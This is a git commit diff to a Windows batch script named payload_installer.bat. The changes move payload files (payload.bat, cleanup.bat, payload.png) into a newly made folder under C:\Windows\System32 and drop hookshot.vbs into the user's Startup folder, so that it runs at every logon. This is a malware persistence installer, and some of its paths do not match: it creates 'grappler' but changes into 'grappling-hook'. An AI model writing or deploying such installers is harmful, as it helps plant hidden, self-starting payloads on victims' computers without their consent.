678470f3ec017426b42410f173bda67df27883b2
xcs011 <jsrusso20@gmail.com>
2020-06-29 01:57:47 -0400

    updating

--- payload_installer.bat
+++ payload_installer.bat
@@ -1,3 +1,9 @@
-move payload.exe, cleanup.bat %appdata%\Microsoft\Windows\Start Menu\Programs\Startup
 cd %appdata%\Microsoft\Windows\Start Menu\Programs\Startup
+mkdir grappler
+cd C:\Windows\System32
+mkdir grappler
+cd C:\Windows\System32\grappling-hook
+move payload.bat, cleanup.bat, payload.png C:\Windows\System32\grappler
+move hookshot.vbs %appdata%\Microsoft\Windows\Start Menu\Programs\Startup\grappler
 cleanup.bat
+exit
